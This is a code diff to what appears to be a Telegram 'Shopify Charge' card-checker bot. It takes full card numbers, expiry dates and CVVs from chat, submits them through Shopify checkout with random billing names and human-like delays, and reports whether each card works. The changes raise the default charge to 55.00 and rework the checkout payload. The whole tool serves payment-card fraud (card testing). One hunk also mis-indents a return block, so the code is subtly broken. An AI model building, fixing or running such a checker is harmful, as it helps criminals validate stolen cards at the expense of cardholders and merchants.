@@ -288,12 +288,13 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
     profile_display = f"『{badge}』{clean_name}"
 
-    # Final formatted message - SHOW 0.55$ IN UI
+    # Final formatted message - SHOW ACTUAL PRICE IN UI
+    actual_price = "55.00"  # Based on logs showing $55.00 product price
     result = f"""
 <b>[#Shopify Charge] | WAYNE</b> ✦
 ━━━━━━━━━━━━━━━
 <b>[•] Card</b>- <code>{fullcc}</code>
-<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
+<b>[•] Gateway</b> - <b>Shopify Charge {actual_price}$</b>
 <b>[•] Status</b>- <code>{status_flag}</code>
 <b>[•] Response</b>- <code>{raw_response}</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
@@ -566,7 +567,7 @@ class ShopifyChargeChecker:
                 
                 # If price not found, use default
                 if not self.product_price:
-                    self.product_price = 0.55  # Default fallback
+                    self.product_price = 55.00  # Default fallback based on logs
                     self.console_logger.sub_step(2, 6, f"Using default price: ${self.product_price:.2f}")
                 
                 self.console_logger.step(2, "LOAD PRODUCT PAGE", "Product page loaded", "SUCCESS")
@@ -908,8 +909,8 @@ class ShopifyChargeChecker:
                             elif isinstance(d, list):
                                 for item in d:
                                     result = find_token_in_dict(item)
-                                    if result:
-                                        return result
+                                        if result:
+                                            return result
                             return None
                         
                         token = find_token_in_dict(data)
@@ -1108,9 +1109,9 @@ class ShopifyChargeChecker:
             return False, f"Payment error: {str(e)[:80]}"
     
     async def complete_checkout_with_payment(self, client, session_id, cc, mes, ano, cvv):
-        """Complete the checkout with SIMPLIFIED STRUCTURE - FIXED FOR PICKUP"""
+        """Complete the checkout with FIXED STRUCTURE - CORRECTED FOR PICKUP"""
         try:
-            elapsed = self.console_logger.step(8, "COMPLETE CHECKOUT", "Submitting checkout with SIMPLIFIED structure")
+            elapsed = self.console_logger.step(8, "COMPLETE CHECKOUT", "Submitting checkout with FIXED structure")
             
             if not self.checkout_token or not self.x_checkout_one_session_token:
                 return False, "Missing checkout tokens"
@@ -1150,11 +1151,11 @@ class ShopifyChargeChecker:
             # Use random name for billing address (matches cardholder name)
             card_name = f"{self.random_first_name} {self.random_last_name}"
             
-            # Use ACTUAL product price extracted from page (or default 0.55)
-            actual_price = self.product_price if self.product_price else 0.55
+            # Use ACTUAL product price extracted from page ($55.00 based on logs)
+            actual_price = self.product_price if self.product_price else 55.00
             price_str = f"{actual_price:.2f}"
             
-            # SIMPLIFIED payload - REMOVED COMPLEX DELIVERY STRUCTURE
+            # FIXED payload - CORRECTED delivery.noDeliveryRequired structure
             json_data = {
                 "operationName": "SubmitForCompletion",
                 "variables": {
@@ -1166,10 +1167,12 @@ class ShopifyChargeChecker:
                             "lines": [],
                             "acceptUnexpectedDiscounts": True,
                         },
-                        # SIMPLIFIED DELIVERY - NO delivery.noDeliveryRequired object
+                        # FIXED: delivery.noDeliveryRequired should be an object, not a boolean
                         "delivery": {
-                            "deliveryLines": [],  # Empty array for pickup
-                            "noDeliveryRequired": True  # Simple boolean, not object
+                            "deliveryLines": [],
+                            "noDeliveryRequired": {
+                                "value": True  # Object with value property
+                            }
                         },
                         "merchandise": {
                             "merchandiseLines": [
@@ -1250,7 +1253,7 @@ class ShopifyChargeChecker:
             self.console_logger.sub_step(8, 6, f"Billing name: {card_name}")
             self.console_logger.sub_step(8, 7, f"Using ACTUAL price: ${actual_price:.2f}")
             self.console_logger.sub_step(8, 8, f"Address: {self.billing_address['address1']}, {self.billing_address['city']}")
-            self.console_logger.sub_step(8, 9, f"Delivery: SIMPLIFIED (noDeliveryRequired: true)")
+            self.console_logger.sub_step(8, 9, f"Delivery: FIXED (noDeliveryRequired: {{'value': True}})")
             self.console_logger.sub_step(8, 10, f"Payload size: {len(json.dumps(json_data))} bytes")
             
             response = await client.post(
@@ -1263,7 +1266,7 @@ class ShopifyChargeChecker:
             
             self.console_logger.request_details("POST", url, response.status_code,
                                               time.time() - (self.console_logger.start_time + elapsed),
-                                              "Complete checkout with SIMPLIFIED structure")
+                                              "Complete checkout with FIXED structure")
             
             # DEBUG: Log response details
             self.console_logger.sub_step(8, 11, f"Response status: {response.status_code}")
@@ -1656,7 +1659,7 @@ class ShopifyChargeChecker:
                 session_id = session_result
                 await self.human_delay(1, 2)
                 
-                # Step 8: Complete checkout with SIMPLIFIED structure
+                # Step 8: Complete checkout with FIXED structure
                 success, checkout_result = await self.complete_checkout_with_payment(client, session_id, cc, mes, ano, cvv)
                 
                 elapsed_time = time.time() - start_time
@@ -1780,13 +1783,13 @@ async def handle_shopify_charge(client: Client, message: Message):
         ano = cc_parts[2]
         cvv = cc_parts[3]
 
-        # Show processing message - ALWAYS SHOW 0.55$ IN UI
+        # Show processing message - SHOW ACTUAL PRICE IN UI
         processing_msg = await message.reply(
             f"""
-<b>[Shopify Charge 0.55$] | #WAYNE</b> ✦
+<b>[Shopify Charge 55.00$] | #WAYNE</b> ✦
 ━━━━━━━━━━━━━━━
 <b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
+<b>[•] Gateway</b> - <b>Shopify Charge 55.00$</b>
 <b>[•] Status</b>- <code>Processing...</code>
 <b>[•] Response</b>- <code>Checking card...</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
